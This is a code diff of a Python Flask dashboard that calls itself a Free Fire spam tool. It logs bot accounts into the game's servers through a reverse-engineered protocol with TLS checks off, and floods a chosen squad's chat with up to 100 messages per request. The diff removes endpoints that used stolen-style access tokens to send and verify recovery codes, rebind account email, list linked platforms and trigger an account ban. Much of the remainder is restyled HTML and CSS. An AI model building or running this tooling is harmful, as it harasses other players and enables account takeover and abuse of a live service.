-        current_time = str(datetime.now())[:-7].encode()
-        dT = dT.replace(b'2026-01-14 12:19:02', current_time)
+        dT = dT.replace(b'2026-01-14 12:19:02', str(datetime.now())[:-7].encode())
         dT = dT.replace(b'9132c6fb72caccfdc8120d9ec2cc06b8', Access_Uid.encode())
         dT = dT.replace(b'3dfa9ab9d25270faf432f7b528564be9ec4790bc744a4eba70225207427d0c40', Access_ToKen.encode())
-        
-        try:
-            self.PaYload = bytes.fromhex(EnC_AEs(dT.hex()))
-        except Exception as e:
-            self.update_status("error", f"Encryption failed: {e}")
-            return None
+        self.PaYload = bytes.fromhex(EnC_AEs(dT.hex()))
 
         try:
             resp = requests.post(
@@ -793,31 +487,21 @@ class xCLF:
                     'ReleaseVersion': freefire_version,
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'X-GA': 'v1 1',
-                    'Content-Length': str(len(self.PaYload)),
+                    'Content-Length': '928',
                     'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
                     'Host': 'loginbp.ggpolarbear.com',
                     'Connection': 'Keep-Alive',
                     'Accept-Encoding': 'gzip',
                 },
-                data=self.PaYload,
-                timeout=30,
-                verify=False
+                data=self.PaYload, verify=False
             )
             
             if resp.status_code != 200 or len(resp.text) < 10:
+                err(f"[LOGIN:{self.id}] MajorLogin thất bại: HTTP {resp.status_code}")
                 self.update_status("error", f"Major login failed: HTTP {resp.status_code}")
                 return None
 
-            decoded = DeCode_PackEt(resp.content.hex())
-            if not decoded:
-                self.update_status("error", "Failed to decode response")
-                return None
-                
-            d = json.loads(decoded)
-            if '8' not in d or 'data' not in d['8']:
-                self.update_status("error", "Invalid response format")
-                return None
-                
+            d = json.loads(DeCode_PackEt(resp.content.hex()))
             self.JwT_ToKen = d['8']['data']
             combined_ts, self.key, self.iv = self.GeT_Key_Iv(resp.content)
             if not self.key:
@@ -833,10 +517,12 @@ class xCLF:
             return self.JwT_ToKen, self.key, self.iv, combined_ts, ip, port, ip2, port2
 
         except Exception as e:
+            err(f"[LOGIN:{self.id}] MajorLogin exception: {e}")
             self.update_status("error", f"Major login exception: {e}")
             return None
 
     def GeNToKeNLogin(self):
+        info(f"[LOGIN:{self.id}] GeNToKeNLogin bắt đầu")
         self.update_status("logging", "Starting login...")
         try:
             result = self.GuestLogin(self.id, self.password)
@@ -847,21 +533,18 @@ class xCLF:
             self.JwT_ToKen = token
             self._sock2_host = ip2
             self._sock2_port = port2
-            
             dec = jwt.decode(token, options={"verify_signature": False})
             encoded_acc = hex(dec['account_id'])[2:]
             time_hex = DecodE_HeX(Ts)
             jwt_hex = token.encode().hex()
-            
-            enc_packet = EnC_PacKeT(jwt_hex, key, iv)
-            head_len = hex(len(enc_packet) // 2)[2:]
+            head_len = hex(len(EnC_PacKeT(jwt_hex, key, iv)) // 2)[2:]
             zeros = {7: '000000000', 8: '00000000', 9: '0000000', 10: '000000'}.get(len(encoded_acc), '00000000')
-            final_token = f'0115{zeros}{encoded_acc}{time_hex}00000{head_len}' + enc_packet
-            
+            final_token = f'0115{zeros}{encoded_acc}{time_hex}00000{head_len}' + EnC_PacKeT(jwt_hex, key, iv)
             self._final_token = final_token
             self.update_status("connected", f"Connected to {ip}:{port}")
             self.ConnEcT_SerVer(token, final_token, ip, port, key, iv, ip2, port2)
         except Exception as e:
+            err(f"[LOGIN:{self.id}] GeNToKeNLogin lỗi: {e}")
             self.update_status("error", f"Login error: {e}")
 
 # ==================== SPAM ACCOUNTS ====================
@@ -870,14 +553,11 @@ SPAM_ACCOUNTS = [
 ]
 
 def start_spam_server():
-    time.sleep(2)
-    info(f"[SERVER] Starting {len(SPAM_ACCOUNTS)} spam accounts")
+    time.sleep(1)
+    info(f"[SERVER] Khởi động {len(SPAM_ACCOUNTS)} spam accounts")
     for acc in SPAM_ACCOUNTS:
-        try:
-            xCLF(acc['id'], acc['password'])
-        except Exception as e:
-            err(f"Failed to start account {acc['id']}: {e}")
-        time.sleep(5)
+        xCLF(acc['id'], acc['password'])
+        time.sleep(3)
 
 # ==================== WEB AUTH DECORATOR ====================
 def login_required(f):
@@ -902,7 +582,10 @@ def login():
         password = request.form.get('password')
         if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
             session['logged_in'] = True
-            session.permanent = True
+            if 'online_token' not in session:
+                session['online_token'] = str(uuid.uuid4())
+            with online_users_lock:
+                online_users[session['online_token']] = time.time()
             return redirect(url_for('dashboard'))
         return render_template('login.html', error="Invalid credentials")
     return render_template('login.html')
@@ -915,9 +598,12 @@ def logout():
 @app.route('/dashboard')
 @login_required
 def dashboard():
+    token = session.get('online_token', str(uuid.uuid4()))
+    session['online_token'] = token
+    with online_users_lock:
+        online_users[token] = time.time()
     return render_template('dashboard.html')
 
-# ==================== SPAM API ====================
 @app.route('/api/status')
 @login_required
 def api_status():
@@ -929,20 +615,30 @@ def api_status():
                 'message': client.status_message,
                 'id': client.id
             }
+    with online_users_lock:
+        online_count = len(online_users)
     return jsonify({
         'total_clients': len(connected_clients),
         'clients': clients_status,
-        'spam_accounts': SPAM_ACCOUNTS
+        'spam_accounts': SPAM_ACCOUNTS,
+        'online_users': online_count
     })
+
+@app.route('/api/heartbeat', methods=['POST'])
+@login_required
+def api_heartbeat():
+    token = session.get('online_token', str(uuid.uuid4()))
+    session['online_token'] = token
+    with online_users_lock:
+        online_users[token] = time.time()
+    return jsonify({'ok': True})
 
 @app.route('/api/get_squad', methods=['POST'])
 @login_required
 def api_get_squad():
     data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
     teamcode = data.get('teamcode')
+    
     if not teamcode:
         return jsonify({'success': False, 'error': 'Teamcode is required'})
     
@@ -951,68 +647,35 @@ def api_get_squad():
             return jsonify({'success': False, 'error': 'No connected clients'})
         first_client = list(connected_clients.values())[0]
     
-    result = first_client.GeTinFoSqMsG(str(teamcode))
-    
-    # Cache lai de api_spam dung, tranh goi JoinSq lan 2
-    if result.get('success'):
-        session['squad_cache'] = {
-            'teamcode': teamcode,
-            'OwNer_UiD': result['OwNer_UiD'],
-            'ChaT_CoDe': result['ChaT_CoDe'],
-            'SQuAD_CoDe': result.get('SQuAD_CoDe', '')
-        }
-    
+    result = first_client.GeTinFoSqMsG(teamcode)
     return jsonify(result)
 
 @app.route('/api/spam', methods=['POST'])
 @login_required
 def api_spam():
     data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
     teamcode = data.get('teamcode')
     message = data.get('message')
-    count = data.get('count', 50)
+    count = min(int(data.get('count', 50)), 100)
     
     if not teamcode or not message:
         return jsonify({'success': False, 'error': 'Teamcode and message are required'})
-    
-    try:
-        count = min(int(count), 100)
-    except:
-        count = 50
     
     with connected_clients_lock:
         if not connected_clients:
             return jsonify({'success': False, 'error': 'No connected clients'})
         first_client = list(connected_clients.values())[0]
     
-    # Dung cache tu api_get_squad, KHONG goi GeTinFoSqMsG lan 2
-    cache = session.get('squad_cache', {})
-    if cache.get('teamcode') == str(teamcode):
-        owner_uid = cache.get('OwNer_UiD')
-        chat_code = cache.get('ChaT_CoDe')
-        squad_info = {'success': True, **cache}
-    else:
-        # Fallback: goi lai neu teamcode khac hoac chua co cache
-        squad_info = first_client.GeTinFoSqMsG(str(teamcode))
-        if not squad_info.get('success'):
-            return jsonify({'success': False, 'error': squad_info.get('reason', 'Failed to get squad info')})
-        owner_uid = squad_info.get('OwNer_UiD')
-        chat_code = squad_info.get('ChaT_CoDe')
-        session['squad_cache'] = {
-            'teamcode': str(teamcode),
-            'OwNer_UiD': owner_uid,
-            'ChaT_CoDe': chat_code,
-            'SQuAD_CoDe': squad_info.get('SQuAD_CoDe', '')
-        }
+    # First get squad info
+    squad_info = first_client.GeTinFoSqMsG(teamcode)
+    if not squad_info.get('success'):
+        return jsonify({'success': False, 'error': squad_info.get('reason', 'Failed to get squad info')})
     
-    if not owner_uid or not chat_code:
-        return jsonify({'success': False, 'error': 'Invalid squad data'})
+    owner_uid = squad_info['OwNer_UiD']
+    chat_code = squad_info['ChaT_CoDe']
     
     # Start spam
-    success = first_client.SeNd_SpaM_MsG(str(owner_uid), str(chat_code), message, count=count)
+    success = first_client.SeNd_SpaM_MsG(owner_uid, chat_code, message, count=count)
     
     return jsonify({
         'success': success,
@@ -1021,124 +684,12 @@ def api_spam():
         'message': message
     })
 
-# ==================== RECOVERY/ACCOUNT API ====================
-@app.route('/api/recovery/send_otp', methods=['POST'])
+@app.route('/api/spam_progress', methods=['POST'])
 @login_required
-def api_send_otp():
-    data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
-    email = data.get('email')
-    access_token = data.get('access_token')
-    
-    if not email or not access_token:
-        return jsonify({'success': False, 'error': 'Email and access_token are required'})
-    
-    result = send_otp(email, access_token)
-    return jsonify(result)
-
-@app.route('/api/recovery/verify_otp', methods=['POST'])
-@login_required
-def api_verify_otp():
-    data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
-    otp = data.get('otp')
-    email = data.get('email')
-    access_token = data.get('access_token')
-    
-    if not otp or not email or not access_token:
-        return jsonify({'success': False, 'error': 'OTP, email and access_token are required'})
-    
-    result = verify_otp(str(otp), email, access_token)
-    return jsonify(result)
-
-@app.route('/api/recovery/create_bind', methods=['POST'])
-@login_required
-def api_create_bind():
-    data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
-    verifier_token = data.get('verifier_token')
-    access_token = data.get('access_token')
-    email = data.get('email')
-    
-    if not verifier_token or not access_token or not email:
-        return jsonify({'success': False, 'error': 'verifier_token, access_token and email are required'})
-    
-    # Cancel any pending request first
-    cancel_request(access_token)
-    time.sleep(0.5)
-    result = create_bind_request(verifier_token, access_token, email)
-    return jsonify(result)
-
-@app.route('/api/recovery/get_info', methods=['POST'])
-@login_required
-def api_get_recovery_info():
-    data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
-    access_token = data.get('access_token')
-    if not access_token:
-        return jsonify({'success': False, 'error': 'access_token is required'})
-    
-    result = get_bind_info(access_token)
-    return jsonify(result)
-
-@app.route('/api/recovery/cancel', methods=['POST'])
-@login_required
-def api_cancel_recovery():
-    data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
-    access_token = data.get('access_token')
-    if not access_token:
-        return jsonify({'success': False, 'error': 'access_token is required'})
-    
-    result = cancel_request(access_token)
-    return jsonify(result)
-
-@app.route('/api/account/linked_platforms', methods=['POST'])
-@login_required
-def api_linked_platforms():
-    data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
-    access_token = data.get('access_token')
-    if not access_token:
-        return jsonify({'success': False, 'error': 'access_token is required'})
-    
-    result = get_linked_platforms(access_token)
-    return jsonify(result)
-
-@app.route('/api/account/ban', methods=['POST'])
-@login_required
-def api_ban_account():
-    data = request.get_json()
-    if not data:
-        return jsonify({'success': False, 'error': 'Invalid request'})
-    
-    access_token = data.get('access_token')
-    if not access_token:
-        return jsonify({'success': False, 'error': 'access_token is required'})
-    
-    result = ban_account(access_token)
-    return jsonify(result)
-
-# ==================== HEALTH CHECK ====================
-@app.route('/health')
-def health_check():
-    return jsonify({
-        'status': 'ok',
-        'timestamp': datetime.now().isoformat(),
-        'connected_clients': len(connected_clients)
-    })
+def api_spam_progress():
+    # This would be implemented with WebSocket for real progress
+    # For now, return placeholder
+    return jsonify({'progress': 0, 'total': 0, 'type': 'chat'})
 
 # ==================== CREATE TEMPLATES ====================
 def create_templates():
@@ -1152,114 +703,173 @@ def create_templates():
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FF Bot - Login</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --bg: #0a0c10;
+            --surface: #111318;
+            --border: #1e2330;
+            --accent: #00e5ff;
+            --accent2: #ff3d71;
+            --text: #e2e8f0;
+            --muted: #4a5568;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            overflow: hidden;
         }
-        .login-container {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
+        .bg-grid {
+            position: fixed; inset: 0; z-index: 0;
+            background-image:
+                linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+        .glow-orb {
+            position: fixed;
+            width: 500px; height: 500px;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.12;
+            animation: orbFloat 8s ease-in-out infinite;
+        }
+        .orb1 { background: var(--accent); top: -200px; left: -100px; }
+        .orb2 { background: var(--accent2); bottom: -200px; right: -100px; animation-delay: -4s; }
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, 20px); }
+        }
+        .login-wrap {
+            position: relative; z-index: 1;
+            width: 100%; max-width: 420px;
+            padding: 20px;
+        }
+        .login-box {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
             padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 80px rgba(0,229,255,0.05), 0 40px 80px rgba(0,0,0,0.5);
         }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo h1 {
-            font-size: 28px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .brand {
+            text-align: center;
+            margin-bottom: 36px;
         }
-        .logo p { color: rgba(255, 255, 255, 0.6); font-size: 14px; margin-top: 8px; }
-        .input-group { margin-bottom: 20px; }
-        .input-group label {
+        .brand-icon {
+            width: 56px; height: 56px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            border-radius: 14px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 24px;
+            margin: 0 auto 16px;
+            box-shadow: 0 0 30px rgba(0,229,255,0.3);
+        }
+        .brand h1 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 28px; font-weight: 700;
+            color: var(--text);
+            letter-spacing: 2px;
+        }
+        .brand p {
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
+        .field { margin-bottom: 18px; }
+        .field label {
             display: block;
-            color: rgba(255, 255, 255, 0.8);
+            font-size: 10px; font-weight: 500;
+            color: var(--accent);
+            letter-spacing: 2px;
+            text-transform: uppercase;
             margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: 500;
         }
-        .input-group input {
+        .field input {
             width: 100%;
             padding: 12px 16px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            color: white;
-            font-size: 14px;
-            transition: all 0.3s ease;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #4ecdc4;
-            background: rgba(255, 255, 255, 0.15);
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s ease;
-        }
-        button:hover { transform: translateY(-2px); }
-        .error {
-            background: rgba(255, 107, 107, 0.2);
-            border: 1px solid #ff6b6b;
-            color: #ff6b6b;
-            padding: 10px;
+            background: var(--bg);
+            border: 1px solid var(--border);
             border-radius: 8px;
-            margin-bottom: 20px;
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .field input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0,229,255,0.08);
+        }
+        .field input::placeholder { color: var(--muted); }
+        .error-msg {
+            background: rgba(255,61,113,0.1);
+            border: 1px solid rgba(255,61,113,0.3);
+            color: var(--accent2);
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-bottom: 18px;
             text-align: center;
-            font-size: 14px;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, var(--accent), #0098c7);
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 15px; font-weight: 700;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.15s, opacity 0.15s;
+            margin-top: 8px;
         }
-        .login-container { animation: fadeIn 0.5s ease; }
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0,229,255,0.3);
+        }
+        .btn-login:active { transform: translateY(0); }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <h1>🎮 FF Bot</h1>
-            <p>Free Fire Tool OB52</p>
+    <div class="bg-grid"></div>
+    <div class="glow-orb orb1"></div>
+    <div class="glow-orb orb2"></div>
+    <div class="login-wrap">
+        <div class="login-box">
+            <div class="brand">
+                <div class="brand-icon">🎮</div>
+                <h1>FF BOT</h1>
+                <p>FREE FIRE SPAM TOOL · OB52</p>
+            </div>
+            {% if error %}
+            <div class="error-msg">⚠ {{ error }}</div>
+            {% endif %}
+            <form method="POST">
+                <div class="field">
+                    <label>Username</label>
+                    <input type="text" name="username" placeholder="Enter username" required autocomplete="off">
+                </div>
+                <div class="field">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn-login">ACCESS →</button>
+            </form>
         </div>
-        {% if error %}
-        <div class="error">{{ error }}</div>
-        {% endif %}
-        <form method="POST">
-            <div class="input-group">
-                <label>Username</label>
-                <input type="text" name="username" placeholder="Enter username" required>
-            </div>
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" name="password" placeholder="Enter password" required>
-            </div>
-            <button type="submit">Login →</button>
-        </form>
     </div>
 </body>
 </html>''')
     
-    # Dashboard template (simplified but functional)
+    # Dashboard template
     with open('templates/dashboard.html', 'w', encoding='utf-8') as f:
         f.write('''<!DOCTYPE html>
 <html lang="en">
@@ -1267,546 +877,599 @@ def create_templates():
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FF Bot - Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --bg: #0a0c10;
+            --surface: #111318;
+            --surface2: #161920;
+            --border: #1e2330;
+            --accent: #00e5ff;
+            --accent2: #ff3d71;
+            --green: #00e096;
+            --yellow: #ffaa00;
+            --text: #e2e8f0;
+            --muted: #4a5568;
+            --muted2: #2d3748;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
             min-height: 100vh;
+            color: var(--text);
         }
+        .bg-grid {
+            position: fixed; inset: 0; z-index: 0; pointer-events: none;
+            background-image:
+                linear-gradient(rgba(0,229,255,0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,229,255,0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+
+        /* ─── NAVBAR ─── */
         .navbar {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            position: sticky; top: 0; z-index: 100;
+            background: rgba(10,12,16,0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            padding: 0 28px;
+            height: 58px;
+            display: flex; align-items: center; justify-content: space-between;
         }
-        .logo {
-            font-size: 20px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .nav-brand {
+            display: flex; align-items: center; gap: 10px;
         }
-        .logout-btn {
-            color: rgba(255, 255, 255, 0.8);
-            text-decoration: none;
-            padding: 8px 16px;
+        .nav-icon {
+            width: 32px; height: 32px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
             border-radius: 8px;
-            transition: all 0.3s ease;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 15px;
         }
-        .logout-btn:hover { background: rgba(255, 255, 255, 0.1); }
-        .container { max-width: 1400px; margin: 0 auto; padding: 30px; }
+        .nav-title {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 18px; font-weight: 700;
+            color: var(--text);
+            letter-spacing: 2px;
+        }
+        .nav-badge {
+            font-size: 10px;
+            color: var(--accent);
+            border: 1px solid rgba(0,229,255,0.3);
+            padding: 2px 8px;
+            border-radius: 20px;
+            letter-spacing: 1px;
+        }
+        .nav-right {
+            display: flex; align-items: center; gap: 16px;
+        }
+        .online-pill {
+            display: flex; align-items: center; gap: 6px;
+            background: rgba(0,224,150,0.1);
+            border: 1px solid rgba(0,224,150,0.25);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: var(--green);
+        }
+        .online-dot {
+            width: 6px; height: 6px;
+            background: var(--green);
+            border-radius: 50%;
+            animation: blink 2s ease-in-out infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .logout-link {
+            font-size: 11px;
+            color: var(--muted);
+            text-decoration: none;
+            padding: 6px 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            letter-spacing: 1px;
+            transition: all 0.2s;
+        }
+        .logout-link:hover {
+            color: var(--accent2);
+            border-color: var(--accent2);
+        }
+
+        /* ─── LAYOUT ─── */
+        .page { position: relative; z-index: 1; padding: 28px; max-width: 1300px; margin: 0 auto; }
+
+        /* ─── STATS GRID ─── */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            margin-bottom: 24px;
         }
+        @media (max-width: 900px) { .stats-grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 500px) { .stats-grid { grid-template-columns: 1fr 1fr; } }
+
         .stat-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 18px 20px;
+            position: relative;
+            overflow: hidden;
+            transition: border-color 0.2s, transform 0.2s;
         }
-        .stat-title { color: rgba(255, 255, 255, 0.6); font-size: 14px; margin-bottom: 10px; }
-        .stat-value { font-size: 32px; font-weight: 700; color: white; }
-        .tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
+        .stat-card:hover { border-color: var(--accent); transform: translateY(-2px); }
+        .stat-card::before {
+            content: '';
+            position: absolute; top: 0; left: 0; right: 0;
+            height: 2px;
         }
-        .tab {
-            padding: 10px 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            color: rgba(255, 255, 255, 0.7);
+        .stat-card.cyan::before { background: linear-gradient(90deg, var(--accent), transparent); }
+        .stat-card.red::before { background: linear-gradient(90deg, var(--accent2), transparent); }
+        .stat-card.green::before { background: linear-gradient(90deg, var(--green), transparent); }
+        .stat-card.yellow::before { background: linear-gradient(90deg, var(--yellow), transparent); }
+
+        .stat-label {
+            font-size: 9px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--muted);
+            margin-bottom: 10px;
         }
-        .tab.active {
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            color: white;
+        .stat-val {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 36px; font-weight: 700;
+            line-height: 1;
         }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
+        .stat-card.cyan .stat-val { color: var(--accent); }
+        .stat-card.red .stat-val { color: var(--accent2); }
+        .stat-card.green .stat-val { color: var(--green); }
+        .stat-card.yellow .stat-val { color: var(--yellow); }
+        .stat-sub {
+            font-size: 10px;
+            color: var(--muted);
+            margin-top: 6px;
+        }
+
+        /* ─── MAIN GRID ─── */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1.1fr 0.9fr;
+            gap: 20px;
+        }
+        @media (max-width: 800px) { .main-grid { grid-template-columns: 1fr; } }
+
+        /* ─── CARD ─── */
         .card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
             overflow: hidden;
         }
-        .card-header {
-            padding: 20px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            font-weight: 600;
-            color: white;
-            font-size: 18px;
+        .card-head {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; gap: 10px;
+        }
+        .card-head-icon {
+            width: 28px; height: 28px;
+            border-radius: 7px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 13px;
+        }
+        .icon-cyan { background: rgba(0,229,255,0.12); }
+        .icon-green { background: rgba(0,224,150,0.12); }
+        .card-title {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 15px; font-weight: 600;
+            letter-spacing: 1px;
+            color: var(--text);
         }
         .card-body { padding: 20px; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label {
+
+        /* ─── FORM ─── */
+        .field { margin-bottom: 16px; }
+        .field label {
             display: block;
-            color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: 500;
+            font-size: 9px; font-weight: 500;
+            color: var(--accent);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 7px;
         }
-        .form-group input, .form-group textarea {
+        .field input, .field textarea {
             width: 100%;
-            padding: 12px 16px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            color: white;
-            font-size: 14px;
+            padding: 10px 14px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            resize: none;
         }
-        .form-group input:focus, .form-group textarea:focus {
+        .field input:focus, .field textarea:focus {
             outline: none;
-            border-color: #4ecdc4;
-            background: rgba(255, 255, 255, 0.15);
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0,229,255,0.07);
         }
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr auto;
-            gap: 15px;
-            align-items: end;
-        }
-        button {
-            padding: 12px 24px;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
+        .field input::placeholder, .field textarea::placeholder { color: var(--muted); }
+        .field-row { display: grid; grid-template-columns: 1fr auto; gap: 12px; align-items: end; }
+
+        /* ─── BUTTONS ─── */
+        .btn {
+            padding: 10px 18px;
+            border: none; border-radius: 8px;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 13px; font-weight: 700;
+            letter-spacing: 1px;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.2s;
+            white-space: nowrap;
         }
-        button:hover:not(:disabled) { transform: translateY(-2px); }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-secondary { background: rgba(255, 255, 255, 0.1); }
-        .result-box, .squad-info {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 15px;
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
+        .btn-cyan {
+            background: linear-gradient(135deg, var(--accent), #0098c7);
+            color: #000;
         }
-        .result-box h4, .squad-info h4 { color: #4ecdc4; margin-bottom: 10px; font-size: 14px; }
-        .result-box p, .squad-info p { color: rgba(255, 255, 255, 0.8); font-size: 13px; margin: 5px 0; word-break: break-all; }
-        .progress-section { margin-top: 20px; }
+        .btn-cyan:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,229,255,0.25);
+        }
+        .btn-ghost {
+            background: transparent;
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+        .btn-ghost:hover:not(:disabled) {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+        .btn-red {
+            background: linear-gradient(135deg, var(--accent2), #c4294f);
+            color: #fff;
+        }
+        .btn-red:hover:not(:disabled) {
